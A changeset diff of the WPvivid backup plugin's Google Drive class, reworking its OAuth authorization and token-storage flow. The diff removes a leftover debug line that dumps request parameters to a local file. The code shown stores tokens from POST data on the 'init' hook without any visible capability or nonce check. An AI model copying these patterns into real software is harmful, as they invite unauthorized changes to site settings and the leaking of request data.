  | [r2661194](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L23 "Show revision 2661194 of this file in browser") | [r2667839](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L23 "Show revision 2667839 of this file in browser") |  |
  | --- | --- | --- |
  | 23 | 23 | public $google\_drive\_secrets; |
  | 24 | 24 |  |
  |  | 25 | public $add\_remote; |
  |  | 26 |  |
  | 25 | 27 | public function \_\_construct($options=array()) |
  | 26 | 28 | { |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L30) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L32) |  |
  | 30 | 32 | { |
  | 31 | 33 | add\_action('init', array($this, 'handle\_auth\_actions')); |
  |  | 34 | //wpvivid\_google\_drive\_add\_remote |
  |  | 35 | add\_action('wp\_ajax\_wpvivid\_google\_drive\_add\_remote',array( $this,'finish\_add\_remote')); |
  | 32 | 36 |  |
  | 33 | 37 | add\_action('wpvivid\_add\_storage\_tab',array($this,'wpvivid\_add\_storage\_tab\_google\_drive'), 10); |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L47) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L51) |  |
  | 47 | 51 | $this->options=$options; |
  | 48 | 52 | } |
  |  | 53 | $this->add\_remote=false; |
  | 49 | 54 | $this->google\_drive\_secrets = array("web"=>array( |
  | 50 | 55 | "client\_id"=>"134809148507-32crusepgace4h6g47ota99jjrvf4j1u.apps.googleusercontent.com", |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L70) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L75) |  |
  | 70 | 75 | public function handle\_auth\_actions() |
  | 71 | 76 | { |
  | 72 |  | if (isset($\_GET['action']) && isset($\_GET['page'])) |
  | 73 |  | { |
  | 74 |  | if($\_GET['page'] === 'WPvivid') |
  | 75 |  | { |
  | 76 |  | if($\_GET['action']=='wpvivid\_google\_drive\_auth') |
  |  | 77 | if(isset($\_GET['action'])) |
  |  | 78 | { |
  |  | 79 | if($\_GET['action']=='wpvivid\_google\_drive\_auth') |
  |  | 80 | { |
  |  | 81 | $auth\_id = uniqid('wpvivid-auth-'); |
  |  | 82 | $res = $this -> compare\_php\_version(); |
  |  | 83 | if($res['result'] == WPVIVID\_FAILED){ |
  |  | 84 | echo '<div class="notice notice-warning is-dismissible"><p>'.$res['error'].'</p></div>'; |
  |  | 85 | return ; |
  |  | 86 | } |
  |  | 87 | try { |
  |  | 88 | include\_once WPVIVID\_PLUGIN\_DIR . '/vendor/autoload.php'; |
  |  | 89 | $client = new Google\_Client(); |
  |  | 90 | $client->setAuthConfig($this->google\_drive\_secrets); |
  |  | 91 | $client->setApprovalPrompt('force'); |
  |  | 92 | $client->addScope(Google\_Service\_Drive::DRIVE\_FILE); |
  |  | 93 | $client->setAccessType('offline'); |
  |  | 94 | $client->setState(admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_google\_drive\_finish\_auth&main\_tab=storage&sub\_tab=googledrive&sub\_page=storage\_account\_google\_drive&auth\_id='.$auth\_id); |
  |  | 95 | $auth\_url = $client->createAuthUrl(); |
  |  | 96 | $remote\_options['auth\_id']=$auth\_id; |
  |  | 97 | update\_option('wpvivid\_tmp\_remote\_options',$remote\_options); |
  |  | 98 | header('Location: ' . filter\_var($auth\_url, FILTER\_SANITIZE\_URL)); |
  |  | 99 | } |
  |  | 100 | catch (Exception $e){ |
  |  | 101 | if($e->getMessage() === 'file does not exist'){ |
  |  | 102 | $error\_msg = \_\_('Authentication failed, the client\_secrets.json file is missing. Please make sure the client\_secrets.json file is in wpvivid-backuprestore\includes\customclass directory.', 'wpvivid-backuprestore'); |
  |  | 103 | echo '<div class="notice notice-error"><p>'.$error\_msg.'</p></div>'; |
  |  | 104 | } |
  |  | 105 | else if($e->getMessage() === 'invalid json for auth config'){ |
  |  | 106 | $error\_msg = \_\_('Authentication failed, the format of the client\_secrets.json file is incorrect. Please delete and re-install the plugin to recreate the file.', 'wpvivid-backuprestore'); |
  |  | 107 | echo '<div class="notice notice-error"><p>'.$error\_msg.'</p></div>'; |
  |  | 108 | } |
  |  | 109 | else{ |
  |  | 110 | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  |  | 111 | } |
  |  | 112 | } |
  |  | 113 | } |
  |  | 114 | else if($\_GET['action']=='wpvivid\_google\_drive\_finish\_auth') |
  |  | 115 | { |
  |  | 116 | try |
  | 77 | 117 | { |
  | 78 |  | if(~~!isset($\_GET['name'])||empty($\_GET['name~~'])) |
  |  | 118 | if(isset($\_GET['error'])) |
  | 79 | 119 | { |
  | 80 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: An alias for remote storage is required.', 'wpvivid-backuprestore').'</p></div>'~~; |
  |  | 120 | header('Location: '.admin\_url().'admin.php?page='.WPVIVID\_PLUGIN\_SLUG.'&action=wpvivid\_google\_drive&main\_tab=storage&sub\_tab=googledrive&sub\_page=storage\_account\_google\_drive&result=error&resp\_msg='.sanitize\_text\_field($\_GET['error'])); |
  | 81 | 121 | return; |
  | 82 | 122 | } |
  | 83 | 123 |  |
  | 84 |  | $alias\_name=sanitize\_text\_field($\_GET['name']); |
  | 85 |  | $auth\_id = uniqid('wpvivid-auth-'); |
  | 86 |  | $default = sanitize\_text\_field($\_GET['default']); |
  | 87 |  |  |
  | 88 |  | $remoteslist=WPvivid\_Setting::get\_all\_remote\_options(); |
  | 89 |  | foreach ($remoteslist as $key=>$value) |
  |  | 124 | $remoteslist = WPvivid\_Setting::get\_all\_remote\_options(); |
  |  | 125 | foreach ($remoteslist as $key => $value) |
  | 90 | 126 | { |
  | 91 |  | if~~(isset($value['name'])&&$value['name'] == $alias\_name~~) |
  |  | 127 | if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) |
  | 92 | 128 | { |
  | 93 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: The alias already exists in storage list.', 'wpvivid-backuprestore').'</p></div>'~~; |
  |  | 129 | \_e('<div class="notice notice-success is-dismissible"><p>You have authenticated the Google Drive account as your remote storage.</p></div>'); |
  | 94 | 130 | return; |
  | 95 | 131 | } |
  | 96 | 132 | } |
  | 97 |  | $res = $this -> compare\_php\_version(); |
  | 98 |  | if($res['result'] == WPVIVID\_FAILED){ |
  | 99 |  | echo '<div class="notice notice-warning is-dismissible"><p>'.$res['error'].'</p></div>'; |
  | 100 |  | return ; |
  | 101 |  | } |
  | 102 |  | try { |
  | 103 |  | include\_once WPVIVID\_PLUGIN\_DIR . '/vendor/autoload.php'; |
  | 104 |  | $client = new Google\_Client(); |
  | 105 |  | $client->setAuthConfig($this->google\_drive\_secrets); |
  | 106 |  | $client->setApprovalPrompt('force'); |
  | 107 |  | $client->addScope(Google\_Service\_Drive::DRIVE\_FILE); |
  | 108 |  | $client->setAccessType('offline'); |
  | 109 |  | $client->setState(admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_google\_drive\_finish\_auth&name=' . $alias\_name . '&default=' . $default.'&auth\_id='.$auth\_id); |
  | 110 |  | $auth\_url = $client->createAuthUrl(); |
  | 111 |  | header('Location: ' . filter\_var($auth\_url, FILTER\_SANITIZE\_URL)); |
  | 112 |  | } |
  | 113 |  | catch (Exception $e){ |
  | 114 |  | if($e->getMessage() === 'file does not exist'){ |
  | 115 |  | $error\_msg = \_\_('Authentication failed, the client\_secrets.json file is missing. Please make sure the client\_secrets.json file is in wpvivid-backuprestore\includes\customclass directory.', 'wpvivid-backuprestore'); |
  | 116 |  | echo '<div class="notice notice-error"><p>'.$error\_msg.'</p></div>'; |
  |  | 133 |  |
  |  | 134 | $tmp\_options=get\_option('wpvivid\_tmp\_remote\_options',false); |
  |  | 135 | if($tmp\_options===false) |
  |  | 136 | { |
  |  | 137 | return; |
  |  | 138 | } |
  |  | 139 | else |
  |  | 140 | { |
  |  | 141 | if($tmp\_options['auth\_id']===$\_GET['auth\_id']) |
  |  | 142 | { |
  |  | 143 | if(empty($\_POST['refresh\_token'])) |
  |  | 144 | { |
  |  | 145 | if(empty($tmp\_options['token']['refresh\_token'])) |
  |  | 146 | { |
  |  | 147 | $err = 'No refresh token was received from Google, which means that you entered client secret incorrectly, or that you did not re-authenticated yet after you corrected it. Please authenticate again.'; |
  |  | 148 | header('Location: '.admin\_url().'admin.php?page='.WPVIVID\_PLUGIN\_SLUG.'&action=wpvivid\_google\_drive&main\_tab=storage&sub\_tab=googledrive&sub\_page=storage\_account\_google\_drive&result=error&resp\_msg='.$err); |
  |  | 149 |  |
  |  | 150 | return; |
  |  | 151 | } |
  |  | 152 | } |
  |  | 153 | else |
  |  | 154 | { |
  |  | 155 | $tmp\_options['type'] = WPVIVID\_REMOTE\_GOOGLEDRIVE; |
  |  | 156 | $tmp\_options['token']['access\_token'] = sanitize\_text\_field($\_POST['access\_token']); |
  |  | 157 | $tmp\_options['token']['expires\_in'] = sanitize\_text\_field($\_POST['expires\_in']); |
  |  | 158 | $tmp\_options['token']['refresh\_token'] = sanitize\_text\_field($\_POST['refresh\_token']); |
  |  | 159 | $tmp\_options['token']['scope'] = sanitize\_text\_field($\_POST['scope']); |
  |  | 160 | $tmp\_options['token']['token\_type'] = sanitize\_text\_field($\_POST['token\_type']); |
  |  | 161 | $tmp\_options['token']['created'] = sanitize\_text\_field($\_POST['created']); |
  |  | 162 | update\_option('wpvivid\_tmp\_remote\_options',$tmp\_options); |
  |  | 163 | } |
  |  | 164 | $this->add\_remote=true; |
  | 117 | 165 | } |
  | 118 |  | else if($e->getMessage() === 'invalid json for auth config'){ |
  | 119 |  | $error\_msg = \_\_('Authentication failed, the format of the client\_secrets.json file is incorrect. Please delete and re-install the plugin to recreate the file.', 'wpvivid-backuprestore'); |
  | 120 |  | echo '<div class="notice notice-error"><p>'.$error\_msg.'</p></div>'; |
  | 121 |  | } |
  | 122 |  | else{ |
  | 123 |  | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  | 124 |  | } |
  | 125 |  | } |
  | 126 |  | } |
  | 127 |  | else if($\_GET['action']=='wpvivid\_google\_drive\_finish\_auth') |
  | 128 |  | { |
  | 129 |  | file\_put\_contents('D:\page.txt', json\_encode($\_GET)); |
  | 130 |  | try { |
  | 131 |  |  |
  | 132 |  | if(isset($\_GET['error'])) |
  |  | 166 | else |
  | 133 | 167 | { |
  | 134 |  | ~~header('Location: '.admin\_url().'admin.php?page='.WPVIVID\_PLUGIN\_SLUG.'&action=wpvivid\_google\_drive&result=error&resp\_msg='.sanitize\_text\_field($\_GET['error']));~~ |
  | 135 |  |  |
  | 136 | 168 | return; |
  | 137 | 169 | } |
  | 138 |  | $remoteslist = WPvivid\_Setting::get\_all\_remote\_options(); |
  | 139 |  | foreach ($remoteslist as $key => $value) { |
  | 140 |  | if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) { |
  | 141 |  | \_e('<div class="notice notice-success is-dismissible"><p>You have authenticated the Google Drive account as your remote storage.</p></div>'); |
  | 142 |  | return; |
  | 143 |  | } |
  |  | 170 | } |
  |  | 171 | } |
  |  | 172 | catch (Exception $e){ |
  |  | 173 | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  |  | 174 | } |
  |  | 175 | } |
  |  | 176 | else if($\_GET['action']=='wpvivid\_google\_drive') |
  |  | 177 | { |
  |  | 178 | try { |
  |  | 179 | if (isset($\_GET['result'])) { |
  |  | 180 | if ($\_GET['result'] == 'success') { |
  |  | 181 | add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_add\_google\_drive\_success')); |
  |  | 182 | } else if ($\_GET['result'] == 'error') { |
  |  | 183 | add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_add\_google\_drive\_error')); |
  | 144 | 184 | } |
  | 145 |  | if(isset($\_POST) && !empty($\_POST) && !isset($\_POST['refresh\_token'])) |
  | 146 |  | { |
  | 147 |  | $err = 'No refresh token was received from Google, which means that you entered client secret incorrectly, or that you did not re-authenticated yet after you corrected it. Please authenticate again.'; |
  | 148 |  | header('Location: '.admin\_url().'admin.php?page='.WPVIVID\_PLUGIN\_SLUG.'&action=wpvivid\_google\_drive&result=error&resp\_msg='.$err); |
  | 149 |  |  |
  | 150 |  | return; |
  | 151 |  | } |
  | 152 |  |  |
  | 153 |  | global $wpvivid\_plugin; |
  | 154 |  |  |
  | 155 |  | $remote\_options['type'] = WPVIVID\_REMOTE\_GOOGLEDRIVE; |
  | 156 |  | $remote\_options['token']['access\_token'] = sanitize\_text\_field($\_POST['access\_token']); |
  | 157 |  | $remote\_options['token']['expires\_in'] = sanitize\_text\_field($\_POST['expires\_in']); |
  | 158 |  | $remote\_options['token']['refresh\_token'] = sanitize\_text\_field($\_POST['refresh\_token']); |
  | 159 |  | $remote\_options['token']['scope'] = sanitize\_text\_field($\_POST['scope']); |
  | 160 |  | $remote\_options['token']['token\_type'] = sanitize\_text\_field($\_POST['token\_type']); |
  | 161 |  | $remote\_options['token']['created'] = sanitize\_text\_field($\_POST['created']); |
  | 162 |  | $remote\_options['name'] = sanitize\_text\_field($\_GET['name']); |
  | 163 |  | $remote\_options['default'] = sanitize\_text\_field($\_GET['default']); |
  | 164 |  | $remote\_options['path'] = WPVIVID\_GOOGLEDRIVE\_DEFAULT\_FOLDER; |
  | 165 |  | $remote\_options['auth\_id'] = sanitize\_text\_field($\_GET['auth\_id']); |
  | 166 |  | $ret = $wpvivid\_plugin->remote\_collection->add\_remote($remote\_options); |
  | 167 |  |  |
  | 168 |  | if ($ret['result'] == 'success') { |
  | 169 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_google\_drive&result=success'); |
  | 170 |  | return; |
  | 171 |  | } else { |
  | 172 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_google\_drive&result=error&resp\_msg=' . $ret['error']); |
  | 173 |  | return; |
  | 174 |  | } |
  | 175 |  | } |
  | 176 |  | catch (Exception $e){ |
  | 177 |  | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  | 178 |  | } |
  | 179 |  | } |
  | 180 |  | else if($\_GET['action']=='wpvivid\_google\_drive') |
  | 181 |  | { |
  | 182 |  | try { |
  | 183 |  | if (isset($\_GET['result'])) { |
  | 184 |  | if ($\_GET['result'] == 'success') { |
  | 185 |  | add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_add\_google\_drive\_success')); |
  | 186 |  | } else if ($\_GET['result'] == 'error') { |
  | 187 |  | add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_add\_google\_drive\_error')); |
  | 188 |  | } |
  | 189 |  | } |
  | 190 |  | } |
  | 191 |  | catch (Exception $e){ |
  | 192 |  | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  | 193 |  | } |
  | 194 |  | } |
  | 195 |  | else if($\_GET['action']=='wpvivid\_google\_drive\_update\_auth') |
  | 196 |  | { |
  | 197 |  | if(!isset($\_GET['name'])||empty($\_GET['name'])) |
  | 198 |  | { |
  | 199 |  | echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: An alias for remote storage is required.', 'wpvivid-backuprestore').'</p></div>'; |
  | 200 |  | return; |
  | 201 |  | } |
  | 202 |  |  |
  | 203 |  | $alias\_name=sanitize\_text\_field($\_GET['name']); |
  | 204 |  | $id = sanitize\_text\_field($\_GET['id']); |
  | 205 |  | $auth\_id = uniqid('wpvivid-auth-'); |
  | 206 |  |  |
  | 207 |  | $remoteslist=WPvivid\_Setting::get\_all\_remote\_options(); |
  | 208 |  | foreach ($remoteslist as $key=>$value) |
  | 209 |  | { |
  | 210 |  | if(isset($value['name'])&&$value['name'] == $alias\_name&&$key!=$id) |
  | 211 |  | { |
  | 212 |  | echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: The alias already exists in storage list.', 'wpvivid-backuprestore').'</p></div>'; |
  | 213 |  | return; |
  | 214 |  | } |
  | 215 |  | } |
  | 216 |  |  |
  | 217 |  | try { |
  | 218 |  | include\_once WPVIVID\_PLUGIN\_DIR . '/vendor/autoload.php'; |
  | 219 |  | $client = new Google\_Client(); |
  | 220 |  | $client->setAuthConfig($this->google\_drive\_secrets); |
  | 221 |  | $client->setApprovalPrompt('force'); |
  | 222 |  | $client->addScope(Google\_Service\_Drive::DRIVE\_FILE); |
  | 223 |  | $client->setAccessType('offline'); |
  | 224 |  | $client->setState(admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_google\_drive\_finish\_update\_auth&name=' . $alias\_name . '&id=' . $id.'&auth\_id='.$auth\_id); |
  | 225 |  | $auth\_url = $client->createAuthUrl(); |
  | 226 |  | header('Location: ' . filter\_var($auth\_url, FILTER\_SANITIZE\_URL)); |
  | 227 |  | } |
  | 228 |  | catch (Exception $e){ |
  | 229 |  | if($e->getMessage() === 'file does not exist'){ |
  | 230 |  | $error\_msg = \_\_('Authentication failed, the client\_secrets.json file is missing. Please make sure the client\_secrets.json file is in wpvivid-backuprestore\includes\customclass directory.', 'wpvivid-backuprestore'); |
  | 231 |  | echo '<div class="notice notice-error"><p>'.$error\_msg.'</p></div>'; |
  | 232 |  | } |
  | 233 |  | else if($e->getMessage() === 'invalid json for auth config'){ |
  | 234 |  | $error\_msg = \_\_('Authentication failed, the format of the client\_secrets.json file is incorrect. Please delete and re-install the plugin to recreate the file.', 'wpvivid-backuprestore'); |
  | 235 |  | echo '<div class="notice notice-error"><p>'.$error\_msg.'</p></div>'; |
  | 236 |  | } |
  | 237 |  | else{ |
  | 238 |  | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  | 239 |  | } |
  | 240 |  | } |
  | 241 |  | } |
  | 242 |  | else if($\_GET['action']=='wpvivid\_google\_drive\_finish\_update\_auth') |
  | 243 |  | { |
  | 244 |  | try { |
  | 245 |  | if(isset($\_GET['error'])) |
  | 246 |  | { |
  | 247 |  | header('Location: '.admin\_url().'admin.php?page='.WPVIVID\_PLUGIN\_SLUG.'&action=wpvivid\_google\_drive\_update&result=error&resp\_msg='.sanitize\_text\_field($\_GET['error'])); |
  | 248 |  |  |
  | 249 |  | return; |
  | 250 |  | } |
  | 251 |  | $remoteslist = WPvivid\_Setting::get\_all\_remote\_options(); |
  | 252 |  | foreach ($remoteslist as $key => $value) { |
  | 253 |  | if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) { |
  | 254 |  | \_e('<div class="notice notice-success is-dismissible"><p>You have successfully updated the storage alias.</p></div>'); |
  | 255 |  | return; |
  | 256 |  | } |
  | 257 |  | } |
  | 258 |  |  |
  | 259 |  | global $wpvivid\_plugin; |
  | 260 |  |  |
  | 261 |  | $remote\_options['type'] = WPVIVID\_REMOTE\_GOOGLEDRIVE; |
  | 262 |  | $remote\_options['token']['access\_token'] = sanitize\_text\_field($\_POST['access\_token']); |
  | 263 |  | $remote\_options['token']['expires\_in'] = sanitize\_text\_field($\_POST['expires\_in']); |
  | 264 |  | $remote\_options['token']['refresh\_token'] = sanitize\_text\_field($\_POST['refresh\_token']); |
  | 265 |  | $remote\_options['token']['scope'] = sanitize\_text\_field($\_POST['scope']); |
  | 266 |  | $remote\_options['token']['token\_type'] = sanitize\_text\_field($\_POST['token\_type']); |
  | 267 |  | $remote\_options['token']['created'] = sanitize\_text\_field($\_POST['created']); |
  | 268 |  | $remote\_options['name'] = sanitize\_text\_field($\_GET['name']); |
  | 269 |  | $remote\_options['path'] = WPVIVID\_GOOGLEDRIVE\_DEFAULT\_FOLDER; |
  | 270 |  | $remote\_options['auth\_id'] = sanitize\_text\_field($\_GET['auth\_id']); |
  | 271 |  | $ret = $wpvivid\_plugin->remote\_collection->update\_remote($remote\_options['auth\_id'], $remote\_options); |
  | 272 |  |  |
  | 273 |  | if ($ret['result'] == 'success') { |
  | 274 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_google\_drive\_update&result=success'); |
  | 275 |  | return; |
  | 276 |  | } else { |
  | 277 |  | header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_google\_drive\_update&result=error&resp\_msg=' . $ret['error']); |
  | 278 |  | return; |
  | 279 |  | } |
  | 280 |  | } |
  | 281 |  | catch (Exception $e){ |
  | 282 |  | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  | 283 |  | } |
  | 284 |  | } |
  | 285 |  | else if($\_GET['action']=='wpvivid\_google\_drive\_update') |
  | 286 |  | { |
  | 287 |  | try { |
  | 288 |  | if (isset($\_GET['result'])) { |
  | 289 |  | if ($\_GET['result'] == 'success') { |
  | 290 |  | add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_edit\_google\_drive\_success')); |
  | 291 |  | } else if ($\_GET['result'] == 'error') { |
  | 292 |  | add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_edit\_google\_drive\_error')); |
  | 293 |  | } |
  | 294 |  | } |
  | 295 |  | } |
  | 296 |  | catch (Exception $e){ |
  | 297 |  | echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'; |
  | 298 |  | } |
  | 299 |  | } |
  | 300 |  | } |
  | 301 |  | } |
  | 302 |  | } |
  |  | 185 | } |
  |  | 186 | } |
  |  | 187 | catch (Exception $e){ |
  |  | 188 | \_e('<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>'); |
  |  | 189 | } |
  |  | 190 | } |
  |  | 191 | } |
  |  | 192 | } |
  |  | 193 |  |
  | 303 | 194 | public function wpvivid\_show\_notice\_add\_google\_drive\_success(){ |
  | 304 | 195 | echo '<div class="notice notice-success is-dismissible"><p>'.\_\_('You have authenticated the Google Drive account as your remote storage.', 'wpvivid-backuprestore').'</p></div>'; |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L307) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L198) |  |
  | 307 | 198 | global $wpvivid\_plugin; |
  | 308 | 199 | $wpvivid\_plugin->wpvivid\_handle\_remote\_storage\_error($\_GET['resp\_msg'], 'Add Google Drive Remote'); |
  | 309 |  | ~~echo '<div class="notice notice-error"><p>'.esc\_html($\_GET['resp\_msg']).'</p></div>';~~ |
  | 310 |  | ~~}~~ |
  | 311 |  | ~~public function wpvivid\_show\_notice\_edit\_google\_drive\_success(){~~ |
  | 312 |  | ~~echo '<div class="notice notice-success is-dismissible"><p>'.\_\_('You have successfully updated the storage alias.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 313 |  | ~~}~~ |
  | 314 |  | ~~public function wpvivid\_show\_notice\_edit\_google\_drive\_error(){~~ |
  | 315 |  | ~~global $wpvivid\_plugin;~~ |
  | 316 |  | ~~$wpvivid\_plugin->wpvivid\_handle\_remote\_storage\_error($\_GET['resp\_msg'], 'Update Google Drive Remote');~~ |
  | 317 | 200 | echo '<div class="notice notice-error"><p>'.esc\_html($\_GET['resp\_msg']).'</p></div>'; |
  | 318 | 201 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2661194#L331) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php?rev=2667839#L214) |  |
  | 331 | 214 | global $wpvivid\_plugin; |
  | 332 | 215 | $root\_path=apply\_filters('wpvivid\_get\_root\_path', WPVIVID\_REMOTE\_GOOGLEDRIVE); |
  | 333 |  | ?> |
  | 334 |  | <div id="storage\_account\_google\_drive" class="storage-account-page"> |
  | 335 |  | <div style="background-color:#f1f1f1; padding: 10px;"> |
  | 336 |  | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Google Drive authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 216 | if($this->add\_remote) |
  |  | 217 | { |
  |  | 218 | ?> |
  |  | 219 | <div id="storage\_account\_google\_drive" class="storage-account-page"> |
  |  | 220 | <div style="background-color:#f1f1f1; padding: 10px;"> |
  |  | 221 | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Google Drive authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 222 | </div> |
  |  | 223 | <div style="color:#8bc34a; padding: 10px 10px 10px 0;"> |
  |  | 224 | <strong>Authentication is done, please continue to enter the storge information, then click 'Add Now' button to save it.</strong> |
  |  | 225 | </div> |
  |  | 226 | <div style="padding: 10px 10px 10px 0;"> |
  |  | 227 | <strong><?php \_e('Enter Your Google Drive Information', 'wpvivid-backuprestore'); ?></strong> |
  |  | 228 | </div> |
  |  | 229 | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  |  | 230 | <tbody> |
  |  | 231 | <tr> |
  |  | 232 | <td class="plugin-title column-primary"> |
  |  | 233 | <div class="wpvivid-storage-form"> |
  |  | 234 | <input type="text" class="regular-text" autocomplete="off" option="googledrive" name="name" placeholder="<?php esc\_attr\_e('Enter a unique alias: e.g. Google Drive-001', 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/[^a-zA-Z0-9\-\_]/g,'')" /> |
  |  | 235 | </div> |
  |  | 236 | </td> |
  |  | 237 | <td class="column-description desc"> |
  |  | 238 | <div class="wpvivid-storage-form-desc"> |
  |  | 239 | <i><?php \_e('A name to help you identify the storage if you have multiple remote storage connected.', 'wpvivid-backuprestore'); ?></i> |
  |  | 240 | </div> |
  |  | 241 | </td> |
  |  | 242 | </tr> |
  |  | 243 | <tr> |
  |  | 244 | <td class="plugin-title column-primary"> |
  |  | 245 | <div class="wpvivid-storage-form"> |
  |  | 246 | <input type="text" class="regular-text" autocomplete="off" name="path" value="<?php esc\_attr\_e($root\_path.WPVIVID\_GOOGLEDRIVE\_DEFAULT\_FOLDER); ?>" readonly="readonly" /> |
  |  | 247 | </div> |
  |  | 248 | </td> |
  |  | 249 | <td class="column-description desc"> |
  |  | 250 | <div class="wpvivid-storage-form-desc"> |
  |  | 251 | <i><?php \_e('All backups will be uploaded to this directory.', 'wpvivid-backuprestore'); ?></i> |
  |  | 252 | </div> |
  |  | 253 | </td> |
  |  | 254 | </tr> |
  |  | 255 | <tr> |
  |  | 256 | <td class="plugin-title column-primary"> |
  |  | 257 | <div class="wpvivid-storage-form"> |
  |  | 258 | <input type="text" class="regular-text" autocomplete="off" value="mywebsite01" readonly="readonly" /> |
  |  | 259 | </div> |
  |  | 260 | </td> |
  |  | 261 | <td class="column-description desc"> |
  |  | 262 | <div class="wpvivid-storage-form-desc"> |
  |  | 263 | <a href="https://docs.wpvivid.com/wpvivid-backup-pro-google-drive-custom-folder-name.html"><?php \_e('Pro feature: Create a directory for storing the backups of the site', 'wpvivid-backuprestore'); ?></a> |
  |  | 264 | </div> |
  |  | 265 | </td> |
  |  | 266 | </tr> |
  |  | 267 | <tr> |
  |  | 268 | <td class="plugin-title column-primary"> |
  |  | 269 | <div class="wpvivid-storage-select"> |
  |  | 270 | <label> |
  |  | 271 | <input type="checkbox" option="googledrive" name="default" checked /><?php \_e('Set as the default remote storage.', 'wpvivid-backuprestore'); ?> |
  |  | 272 | </label> |
  |  | 273 | </div> |
  |  | 274 | </td> |
  |  | 275 | <td class="column-description desc"> |
  |  | 276 | <div class="wpvivid-storage-form-desc"> |
  |  | 277 | <i><?php \_e('Once checked, all this sites backups sent to a remote storage destination will be uploaded to this storage by default.', 'wpvivid-backuprestore'); ?></i> |
  |  | 278 | </div> |
  |  | 279 | </td> |
  |  | 280 | </tr> |
  |  | 281 | <tr> |
  |  | 282 | <td class="plugin-title column-primary"> |
  |  | 283 | <div class="wpvivid-storage-form"> |
  |  | 284 | <input id="wpvivid\_google\_drive\_auth" class="button-primary" type="submit" value="<?php esc\_attr\_e('Add Now', 'wpvivid-backuprestore'); ?>" /> |
  |  | 285 | </div> |
  |  | 286 | </td> |
  |  | 287 | <td class="column-description desc"> |
  |  | 288 | <div class="wpvivid-storage-form-desc"> |
  |  | 289 | <i><?php \_e('Click the button to add the storage.', 'wpvivid-backuprestore'); ?></i> |
  |  | 290 | </div> |
  |  | 291 | </td> |
  |  | 292 | </tr> |
  |  | 293 | </tbody> |
  |  | 294 | </table> |
  | 337 | 295 | </div> |
  | 338 |  | <div style="padding: 10px 10px 10px 0;"> |
  | 339 |  | <strong><?php \_e('Enter Your Google Drive Information', 'wpvivid-backuprestore'); ?></strong> |
  | 340 |  | </div> |
  | 341 |  | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  | 342 |  | <tbody> |
  | 343 |  | <tr> |
  | 344 |  | <td class="plugin-title column-primary"> |
  | 345 |  | <div class="wpvivid-storage-form"> |
  | 346 |  | <input type="text" class="regular-text" autocomplete="off" option="googledrive" name="name" placeholder="<?php esc\_attr\_e('Enter a unique alias: e.g. Google Drive-001', 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/[^a-zA-Z0-9\-\_]/g,'')" /> |
